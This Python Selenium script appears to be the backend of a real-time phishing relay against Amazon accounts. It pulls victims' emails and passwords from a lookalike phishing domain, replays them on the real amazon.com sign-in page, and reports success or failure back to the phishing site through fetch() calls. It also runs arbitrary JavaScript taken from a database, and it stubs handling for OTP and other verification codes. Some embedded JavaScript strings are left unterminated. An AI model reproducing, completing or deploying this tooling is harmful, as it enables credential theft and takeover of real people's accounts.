import time
import os
import random
import datetime
import logging
import zipfile
import pickle
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.alert import Alert
import a_db
import json
logging.basicConfig(level=logging.INFO,
                    format='(%(module)s) %(message)s',
                    handlers=[logging.FileHandler("session.log", 'w+', 'utf-8')])
logger = logging.getLogger("Log")
url_fake_site = "https://amazone.online"


class Abrowser(object):
    def __init__(self, id_thr: int, type_script: str,
                 script_path: str, account_path: str,
                 user_id: int, user_login: str, user_id_db: int):
        try:
            a_db.session_now_plus()
            self.id_thr = id_thr
            self.type_script = type_script
            self.script_path = script_path
            self.account_path = account_path
            self.user_id = user_id
            self.user_id_db = user_id_db
            self.user_login = user_login
            self.chrome_options = Options()
            self.chrome_options.add_argument("--lang=en")
            self.chrome_options.add_argument("--mute-audio")
            self.chrome_options.add_argument(
                f"--user-data-dir={self.account_path}")
            d = DesiredCapabilities.CHROME
            d['goog:loggingPrefs'] = { 'browser':'INFO' }
            self.driver = webdriver.Chrome(options=self.chrome_options, desired_capabilities=d)
            self.driver.set_page_load_timeout(60)
            self.print(f"Start work browsing")
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def print(self, *msg):
        full_msg = str()
        full_msg += f"({str(self.id_thr)}) "
        full_msg += f"({datetime.datetime.utcnow().strftime('%H:%M:%S')}) "
        if hasattr(self, 'user_login'):
             full_msg += f"({self.user_login}) "
        # if hasattr(self, 'proxy'):
        #     full_msg += f"({self.proxy}) "
        full_msg += "=> "
        full_msg += " | ".join(str(x) for x in msg)
        logger.info(full_msg)
        # print(full_msg)

    def quit(self):
        if hasattr(self, 'driver'):
            self.driver.quit()
        a_db.session_now_minus()
        a_db.acc_stop_work(self.user_id_db)
        return

    def is_end_work(self):
        return a_db.is_end_work() 

    def searcher(self):
        try:
            self.driver.set_script_timeout(1)
            while self.is_end_work() is False:
                self.get_new_users()
                execute_codes = a_db.get_execute_codes()
                if execute_codes is not None:
                    self.print(f"Find {len(execute_codes)} execute_codes")
                    for execute_code in execute_codes:
                        code = execute_code["code"]
                        code_id = execute_code["id"]
                        try:
                            self.driver.execute_async_script(code)
                        except:
                            pass
                        self.print(f"Execute id {code_id}, code is : {code}")
                        a_db.set_executed(code_id)

                accs_who_need = a_db.accs_who_need()
                if accs_who_need is not None:
                    for acc in accs_who_need:
                        if acc["status"] == "Need password":
                            self.get_acc_password(int(acc["id"]))
                            pass
                        elif acc["status"] == "Need otp code":
                            pass
                        elif acc["status"] == "Need zip code":
                            pass
                        elif acc["status"] == "Need email code":
                            pass
                        elif acc["status"] == "Need phone code":
                            pass
                time.sleep(3)
            self.quit()
        except Exception as ex:
            self.print(ex)
            self.quit()
            return


    def get_acc_password(self, id: int):
        try:
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20authentication")
            el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
            for d in newlist:
                acc_id = d["id"]
                if int(acc_id) != id:
                    continue
                acc_password = d["password"]
                a_db.acc_set_password(int(acc_id), acc_password)
                self.print(f"Set password {acc_password} to acc id_db {acc_id}")
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return
    def get_new_users(self):
        try:
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20email%20check")
            el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
            # self.print(newlist)
            # lines = []
            # lines = sorted(lines, key=lambda k: k['id'], reverse=True)
            new_accs = []
            for d in newlist:
                acc_id = d["id"]
                acc_login = d["login"]
                acc_datetime = d["created_at"]
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}")
                acc_datetime = acc_datetime[:-5]
                acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
                datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
                datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
                diff_datetime = datetime_now - acc_datetime
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
                if (diff_datetime.seconds / 60) > 3:
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
                    break
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different LESS than 3 minutes, go to ADD to db")
                new_accs.append({
                    "id" : acc_id,
                    "login" : f"{acc_login}"
                })
            self.print(f"We find {len(new_accs)} new accs")
            if len(new_accs) > 0:
                return a_db.get_new_session(new_accs)
            else:
                return None
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def user(self):
        try:
            if self.is_end_work() is True:
                self.quit()
                return
            self.driver.get(f"https://www.amazon.com/")
            self.print("I get Amazon!!!")
            try:
                el_nav_ya_signin = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//a[@data-nav-ref = 'nav_ya_signin']")))
            except Exception as ex:
                raise Exception("Not find el_nav_ya_signin")

            sign_in_link = el_nav_ya_signin.get_attribute("href")
            self.driver.get(sign_in_link)

            self.print(f"After click on el_nav_ya_signin {self.driver.current_url}")

            try:
                el_input_email = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
            except Exception as ex:
                raise Exception("Not find el_input_email")

            try:
                el_input_submit= WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
            except Exception as ex:
                raise Exception("Not find el_input_submit")

            self.driver.execute_script(f"arguments[0].setAttribute('value','{self.user_login}')", el_input_email)
            actions = ActionChains(self.driver)
            actions.move_to_element(el_input_submit)
            actions.move_by_offset(-3, -2)
            actions.pause(random.randint(1, 2))
            actions.click()
            actions.perform()
            # self.print(f"After click on el_input_submit {self.driver.current_url}")

            time.sleep(3)
            is_exept = False
            try:
                el_input_email = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
            except Exception as ex:
                self.print(ex)
                is_exept = True
                pass

            if is_exept is True:
                url_to_email_check_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_error"
                script_data = f"fetch('{url_to_email_check_error}'," + """{
                        method: 'PATCH',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ 
                            error_message: 'We cannot find an account with that email address 
                        })
                    })"""
                a_db.add_executed_code(script_data)
                raise Exception("Bad email")

            url_to_email_check_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_success"
            script_data = f"fetch('{url_to_email_check_success}',"+" {method: 'PATCH'}"+").then((response) => response.json()).then((data) => " + "{ console.log(data)})"
            a_db.add_executed_code(script_data)
            a_db.acc_change_status(self.user_id_db, "Need password")
            first_try_password = True
            while True:
                if self.is_end_work() is True:
                    self.quit()
                    return
                password = a_db.acc_get_password(self.user_id_db)
                if password is None:
                    time.sleep(1)
                    continue

                self.password = password
                
                if first_try_password == True:
                    try:
                        el_rememberMe = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberMe']")))
                    except Exception as ex:
                        raise Exception("el_rememberMe")
                    el_rememberMe.click()
                    first_try_password = False

                try:
                    el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
                except Exception as ex:
                    raise Exception("el_password")
                self.driver.execute_script(f"arguments[0].setAttribute('value','{self.password}')", el_password)

                try:
                    el_signInSubmit = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                except Exception as ex:
                    raise Exception("el_signInSubmit")

                el_signInSubmit.click()
                time.sleep(3)

                is_exept = False
                try:
                    el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
                except Exception as ex:
                    is_exept = True
                    self.print(ex)
                
                if is_exept is True:
                    url_to_email_auth_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_error"
                    script_data = f"fetch('{url_to_email_auth_error}'," + """{
                            method: 'PATCH',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ 
                                error_message: 'Your password is incorrect
                            })
                        })"""
                    a_db.acc_set_password(self.user_id_db, "None")
                    a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need password")
                    self.print(f"Bad password {self.password}")
                    continue
                break
            
            
            
            time.sleep(20)
        except Exception as ex:
            self.print(ex)
            self.quit()
            return